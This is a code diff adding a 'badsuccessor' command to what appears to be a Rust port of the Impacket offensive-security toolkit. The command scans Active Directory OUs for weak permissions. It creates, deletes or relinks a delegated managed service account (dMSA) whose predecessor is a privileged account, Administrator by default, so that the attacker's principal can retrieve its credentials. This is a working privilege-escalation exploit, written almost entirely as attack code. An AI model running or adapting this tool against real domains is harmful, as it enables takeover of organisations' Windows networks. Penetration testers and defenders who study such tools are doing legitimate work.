@@ -108,6 +108,7 @@ fn print_usage() {
     println!("  GetLAPSPassword <TARGET> [-computer <name>]          Query Active Directory LAPS / Windows LAPS passwords (LDAP TCP/389)");
     println!("  CheckLDAPStatus <TARGET> [-port <port>]              Audit LDAP RootDSE, supported capabilities & signing enforcement");
     println!("  addcomputer <TARGET> [-computer-name <N>] [options]  Provision a computer account in Active Directory (LDAP TCP/389)");
+    println!("  badsuccessor <TARGET> [-action <search|add|del|mod>] Windows Server 2025 dMSA exploitation suite (BadSuccessor)");
     println!("  dacledit <TARGET> -target-dn <DN> [options]          Inspect or modify Active Directory DACL permissions (LDAP TCP/389)");
     println!("  owneredit <TARGET> -dn <DN> [-action query|set]      Query or change Active Directory object owner SID (LDAP TCP/389)");
     println!("  dnstool <TARGET> -action <query|add|del> [options]   Active Directory Integrated DNS record management ([MS-DNSP] LDAP)");
@@ -9348,6 +9349,283 @@ fn cmd_addcomputer(args: &[String]) {
     client.unbind().ok();
 }
 
+fn cmd_badsuccessor(args: &[String]) {
+    use impacket_ldap::dmsa::{
+        add_dmsa, delete_dmsa, modify_dmsa_predecessor, scan_vulnerable_ous,
+    };
+    use impacket_ldap::LdapClient;
+    use impacket_ndr::RpcSid;
+
+    print!("{}", version::BANNER);
+    if args.is_empty() {
+        eprintln!("Usage: impacket-rs badsuccessor <TARGET> [-action <search|add|delete|modify>] [options]");
+        eprintln!("  Windows Server 2025 Delegated Managed Service Account (dMSA) exploitation suite (BadSuccessor)");
+        eprintln!();
+        eprintln!("Actions:");
+        eprintln!("  search  (default) Scan OUs for loose object creation rights vulnerable to BadSuccessor");
+        eprintln!("  add     Provision a new dMSA targeting a high-privileged predecessor account");
+        eprintln!("  delete  Remove a created dMSA account from target OU");
+        eprintln!("  modify  Modify predecessor link on an existing dMSA account");
+        std::process::exit(1);
+    }
+
+    let spec = match parse_target_with_hashes(args) {
+        Ok(t) => t,
+        Err(e) => {
+            eprintln!("[-] Invalid target '{}': {}", args[0], e);
+            std::process::exit(1);
+        }
+    };
+
+    let mut action = "search".to_string();
+    let mut target_ou: Option<String> = None;
+    let mut dmsa_name: Option<String> = None;
+    let mut target_account = "Administrator".to_string();
+    let mut principals_allowed: Option<String> = None;
+    let mut dns_hostname: Option<String> = None;
+    let mut custom_base_dn: Option<String> = None;
+    let mut port: u16 = 389;
+
+    let mut i = 1;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-action" if i + 1 < args.len() => {
+                action = args[i + 1].to_ascii_lowercase();
+                i += 2;
+            }
+            "-target-ou" | "-ou" if i + 1 < args.len() => {
+                target_ou = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-dmsa-name" | "-name" if i + 1 < args.len() => {
+                dmsa_name = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-target-account" | "-account" if i + 1 < args.len() => {
+                target_account = args[i + 1].clone();
+                i += 2;
+            }
+            "-principals-allowed" | "-allowed" if i + 1 < args.len() => {
+                principals_allowed = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-dns-hostname" if i + 1 < args.len() => {
+                dns_hostname = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-base" | "-base-dn" if i + 1 < args.len() => {
+                custom_base_dn = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-port" if i + 1 < args.len() => {
+                if let Ok(p) = args[i + 1].parse() {
+                    port = p;
+                }
+                i += 2;
+            }
+            _ => i += 1,
+        }
+    }
+
+    let base_dn = custom_base_dn.unwrap_or_else(|| {
+        if !spec.domain.is_empty() {
+            domain_to_base_dn(&spec.domain)
+        } else {
+            String::new()
+        }
+    });
+
+    let host = spec.effective_target_ip();
+    let addr = format!("{}:{}", host, port);
+    println!("[*] Connecting to LDAP on {}...", addr);
+    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] LDAP connection failed: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let bind_dn = if spec.username.is_empty() {
+        String::new()
+    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
+        spec.username.clone()
+    } else if !spec.domain.is_empty() {
+        format!("{}@{}", spec.username, spec.domain)
+    } else {
+        spec.username.clone()
+    };
+
+    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
+    if !bind_dn.is_empty() {
+        println!("[*] Authenticating as '{}'...", bind_dn);
+        if let Err(e) = client.bind_simple(&bind_dn, password) {
+            eprintln!("[-] LDAP bind failed: {}", e);
+            std::process::exit(1);
+        }
+        println!("[+] Bind successful.");
+    }
+
+    match action.as_str() {
+        "search" => {
+            println!("[*] Searching for OUs vulnerable to BadSuccessor attack under '{}'...", base_dn);
+            let domain_entries = client.search(
+                &base_dn,
+                impacket_ldap::SearchScope::BaseObject,
+                &impacket_ldap::filter_present("objectClass"),
+                &["objectSid"],
+            ).unwrap_or_default();
+
+            let domain_sid_prefix = domain_entries.first()
+                .and_then(|e| e.get_first_raw("objectSid"))
+                .and_then(|b| RpcSid::from_le_bytes(b).ok())
+                .map(|s| s.to_string());
+
+            match scan_vulnerable_ous(&mut client, &base_dn, domain_sid_prefix.as_deref()) {
+                Ok(vulns) => {
+                    println!("[+] Found {} potential BadSuccessor vector(s):", vulns.len());
+                    for v in &vulns {
+                        let name_str = v.principal_name.as_deref().unwrap_or(&v.principal_sid);
+                        println!("  [!] OU: {}", v.ou_dn);
+                        println!("      Identity: {} ({})", name_str, v.principal_sid);
+                        println!("      Rights  : {}", v.granted_rights.join(", "));
+                        println!();
+                    }
+                }
+                Err(e) => eprintln!("[-] Scan failed: {}", e),
+            }
+        }
+        "add" => {
+            let target_ou = match target_ou {
+                Some(ou) => ou,
+                None => {
+                    eprintln!("[-] Target OU is required for dMSA creation. Specify -target-ou <OU_DN>");
+                    std::process::exit(1);
+                }
+            };
+            let dmsa_name = dmsa_name.unwrap_or_else(|| {
+                let rand_id = impacket_core::encode_hex(&impacket_crypto::sha256(b"dmsa_rand_name")[..4]);
+                format!("dMSA-{}", rand_id.to_uppercase())
+            });
+
+            let target_filter = impacket_ldap::filter_equality("sAMAccountName", &target_account);
+            let target_entries = client.search(
+                &base_dn,
+                impacket_ldap::SearchScope::WholeSubtree,
+                &target_filter,
+                &["distinguishedName"],
+            ).unwrap_or_default();
+
+            let target_dn = match target_entries.first() {
+                Some(e) => e.dn.clone(),
+                None => {
+                    eprintln!("[-] Target predecessor account '{}' not found in domain.", target_account);
+                    std::process::exit(1);
+                }
+            };
+
+            let allowed_user = principals_allowed.unwrap_or_else(|| spec.username.clone());
+            let user_filter = impacket_ldap::filter_equality("sAMAccountName", &allowed_user);
+            let user_entries = client.search(
+                &base_dn,
+                impacket_ldap::SearchScope::WholeSubtree,
+                &user_filter,
+                &["objectSid"],
+            ).unwrap_or_default();
+
+            let principal_sid = match user_entries.first().and_then(|e| e.get_first_raw("objectSid")).and_then(|b| RpcSid::from_le_bytes(b).ok()) {
+                Some(s) => s,
+                None => {
+                    eprintln!("[-] Could not resolve objectSid for allowed principal '{}'.", allowed_user);
+                    std::process::exit(1);
+                }
+            };
+
+            println!("[*] Creating dMSA '{}' under '{}'...", dmsa_name, target_ou);
+            println!("[*] Linking predecessor account: {}", target_dn);
+            println!("[*] Granting managed password retrieval to: {} ({})", allowed_user, principal_sid);
+
+            let dns_fqdn = dns_hostname.as_deref().unwrap_or(&spec.domain);
+            match add_dmsa(&mut client, &target_ou, &dmsa_name, &target_dn, &principal_sid, dns_fqdn) {
+                Ok(dn) => {
+                    println!("[+] Successfully created dMSA account!");
+                    println!("  Distinguished Name : {}", dn);
+                    println!("  sAMAccountName     : {}$", dmsa_name.trim_end_matches('$'));
+                    println!("  Predecessor Link   : {}", target_dn);
+                    println!("  Migration State    : 2 (Active/Migration)");
+                }
+                Err(e) => eprintln!("[-] Failed to create dMSA: {}", e),
+            }
+        }
+        "delete" => {
+            let target_ou = match target_ou {
+                Some(ou) => ou,
+                None => {
+                    eprintln!("[-] Target OU is required for dMSA deletion. Specify -target-ou <OU_DN>");
+                    std::process::exit(1);
+                }
+            };
+            let dmsa_name = match dmsa_name {
+                Some(n) => n,
+                None => {
+                    eprintln!("[-] dMSA name is required for deletion. Specify -dmsa-name <NAME>");
+                    std::process::exit(1);
+                }
+            };
+            println!("[*] Deleting dMSA '{}' from '{}'...", dmsa_name, target_ou);
+            match delete_dmsa(&mut client, &target_ou, &dmsa_name) {
+                Ok(_) => println!("[+] Successfully deleted dMSA '{}'.", dmsa_name),
+                Err(e) => eprintln!("[-] Failed to delete dMSA: {}", e),
+            }
+        }
+        "modify" => {
+            let target_ou = match target_ou {
+                Some(ou) => ou,
+                None => {
+                    eprintln!("[-] Target OU is required for dMSA modification. Specify -target-ou <OU_DN>");
+                    std::process::exit(1);
+                }
+            };
+            let dmsa_name = match dmsa_name {
+                Some(n) => n,
+                None => {
+                    eprintln!("[-] dMSA name is required for modification. Specify -dmsa-name <NAME>");
+                    std::process::exit(1);
+                }
+            };
+            let dmsa_dn = format!("CN={},{}", dmsa_name.trim_end_matches('$'), target_ou);
+
+            let target_filter = impacket_ldap::filter_equality("sAMAccountName", &target_account);
+            let target_entries = client.search(
+                &base_dn,
+                impacket_ldap::SearchScope::WholeSubtree,
+                &target_filter,
+                &["distinguishedName"],
+            ).unwrap_or_default();
+
+            let target_dn = match target_entries.first() {
+                Some(e) => e.dn.clone(),
+                None => {
+                    eprintln!("[-] New predecessor account '{}' not found in domain.", target_account);
+                    std::process::exit(1);
+                }
+            };
+
+            println!("[*] Modifying dMSA predecessor link on '{}' to '{}'...", dmsa_dn, target_dn);
+            match modify_dmsa_predecessor(&mut client, &dmsa_dn, &target_dn) {
+                Ok(_) => println!("[+] Successfully updated predecessor link to '{}'.", target_dn),
+                Err(e) => eprintln!("[-] Failed to modify dMSA: {}", e),
+            }
+        }
+        other => {
+            eprintln!("[-] Unknown action '{}'. Supported: search, add, delete, modify", other);
+            std::process::exit(1);
+        }
+    }
+
+    client.unbind().ok();
+}
+
 fn cmd_dacledit(args: &[String]) {
     use impacket_ldap::dacledit::{grant_right, read_dacl, revoke_rights, DaclRight};
     use impacket_ldap::LdapClient;
@@ -13700,6 +13978,7 @@ fn main() {
             cmd_check_ldap_status(&args[1..])
         }
         Some("addcomputer") | Some("add-computer") => cmd_addcomputer(&args[1..]),
+        Some("badsuccessor") | Some("bad-successor") | Some("dmsa") => cmd_badsuccessor(&args[1..]),
         Some("dacledit") | Some("dacl-edit") => cmd_dacledit(&args[1..]),
         Some("owneredit") | Some("owner-edit") => cmd_owneredit(&args[1..]),
         Some("dnstool") | Some("dns-tool") => cmd_dnstool(&args[1..]),
